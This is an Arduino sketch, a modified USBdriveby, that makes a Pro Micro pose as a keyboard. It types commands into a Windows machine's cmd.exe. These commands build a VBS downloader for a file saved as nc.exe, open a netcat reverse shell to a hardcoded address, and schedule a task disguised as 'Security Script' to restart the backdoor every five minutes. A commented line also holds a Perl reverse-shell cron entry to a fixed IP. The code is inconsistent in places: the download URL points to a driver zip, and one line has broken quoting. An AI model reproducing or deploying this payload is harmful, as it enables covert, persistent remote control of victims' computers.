// USBdriveby, by samy kamkar
// http://samy.pl/usbdriveby

// Modified to run on Arduino Pro Micro by Chawasit

// in order to listen for the backdoor installed, simply run netcat:
// nc -l 1337
// this listens on port 1337 for a connection from an infected machine
// and once connected, you can begin send commands to the machine!

// here is the ip of the remote dns server we're running which responds to normal DNS requests, but spoofs other requests we specify
// code for our dns spoofing server is at http://samy.pl/usbdriveby

#define EVIL_SERVER "66.228.55.205"
String NC_URL = "https://cdn.sparkfun.com/assets/learn_tutorials/1/2/1/SH32U4_driver.zip";
String NC_SAVE_NAME = "nc.exe";
String NC_SAVE_PATH = "d:\\";
String REMOTE_ADDR = "192.168.1.1";
String REMOTE_PORT = "1337";


// delay ms
int ds = 500;

#define LED_PIN 17 // LED Rx pin, LED TX use TXLED0 and TXLED1 macro to control it

void setup()
{
  // give us a little time to connect up
  delay(1000);

  // allow controlling LED
  pinMode(LED_PIN, OUTPUT);

  // turn the LED on while we're pwning
  digitalWrite(LED_PIN, HIGH);

  // add our reverse tunneling backdoor to
    // cron to run every 5 minutes
  // typeln("(crontab -l ; echo \"*/5 * * * * perl -MIO::Socket -e'\\$c=new IO::Socket::INET(\\\"72.14.179.47:1337\\\");print\\$c \\`\\$_\\`while<\\$c>'\")  | crontab -");
  openapp("cmd.exe");

  typeln("d:");

  get_nc();

  get_shell();
}


// type a string (pressing enter at the end)
// we have extra delays so we can see what's happening
void typeln(String chars)
{
  Keyboard.print(chars);
  delay(ds);
  Keyboard.println("");
  delay(ds/2);
}

// open an application on OS X via spotlight/alfred
void openapp(String app)
{
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.releaseAll();
  delay( ds );

  typeln(app);
  delay( ds * 3 );
}


void k(char key)
{
  Keyboard.press(key);
  delay(ds/2);

  Keyboard.releaseAll();
  delay(ds/2);
}

void mod(int mod, int key)
{
  Keyboard.press(mod);
  Keyboard.press(key);
  delay(ds);

  Keyboard.releaseAll();
  delay(ds);
}

void ctrl(char key)
{
  mod( KEY_LEFT_CTRL, key);
}

void cmd(char key)
{
  mod( KEY_LEFT_GUI, key);
}

void shift(char key)
{
  mod( KEY_LEFT_SHIFT, key);
}

void file(String file, String chars)
{
  String cmd = "echo "+chars+" >> "+file;
  typeln( cmd );
}

void get_nc()
{
  file("get_nc.vbs", "    strFileURL = \""+NC_URL+"\"   ");
  file("get_nc.vbs", "    strHDLocation = \""+NC_SAVE_PATH+NC_SAVE_NAME+"\"   ");
  file("get_nc.vbs", "    Set objXMLHTTP = CreateObject(\"MSXML2.XMLHTTP\")   ");
  file("get_nc.vbs", "    objXMLHTTP.open \"GET\", strFileURL, false   ");
  file("get_nc.vbs", "    objXMLHTTP.send()   ");
  file("get_nc.vbs", "    If objXMLHTTP.Status = 200 Then   ");
  file("get_nc.vbs", "      Set objADOStream = CreateObject(\"ADODB.Stream\")   ");
  file("get_nc.vbs", "      objADOStream.Open   ");
  file("get_nc.vbs", "      objADOStream.Type = 1    ");
  file("get_nc.vbs", "      objADOStream.Write objXMLHTTP.ResponseBody   ");
  file("get_nc.vbs", "      objADOStream.Position = 0       ");
  file("get_nc.vbs", "      Set objFSO = Createobject(\"Scripting.FileSystemObject\")   ");
  file("get_nc.vbs", "        If objFSO.Fileexists(strHDLocation) Then objFSO.DeleteFile strHDLocation   ");
  file("get_nc.vbs", "      Set objFSO = Nothing   ");
  file("get_nc.vbs", "      objADOStream.SaveToFile strHDLocation   ");
  file("get_nc.vbs", "      objADOStream.Close   ");
  file("get_nc.vbs", "      Set objADOStream = Nothing   ");
  file("get_nc.vbs", "    End if   ");
  file("get_nc.vbs", "    Set objXMLHTTP = Nothing   ");
  typeln("get_nc.vbs");
  delay( ds*4 );
}

void get_shell()
{
  file("backdoor.vbs", "Set objShell = CreateObject(\"WScript.Shell\")  ");
  file("backdoor.vbs", "objShell.Exec(\""+NC_SAVE_PATH+NC_SAVE_NAME+" -d "+REMOTE_ADDR+" "+REMOTE_PORT+" -e c:\\WINDOWS\\system32\\cmd.exe\") ");
  typeln("backdoor.vbs");
  typeln("schtasks /create /sc minute /mo 5 /tn "Security Script" /tr "+NC_SAVE_PATH+"\\backdoor.vbs")
}

void loop()
{
  // blink quickly so we know we're done
  digitalWrite(LED_PIN, HIGH);
  TXLED1;
  delay(ds);
  digitalWrite(LED_PIN, LOW);
  TXLED0;
  delay(ds);
}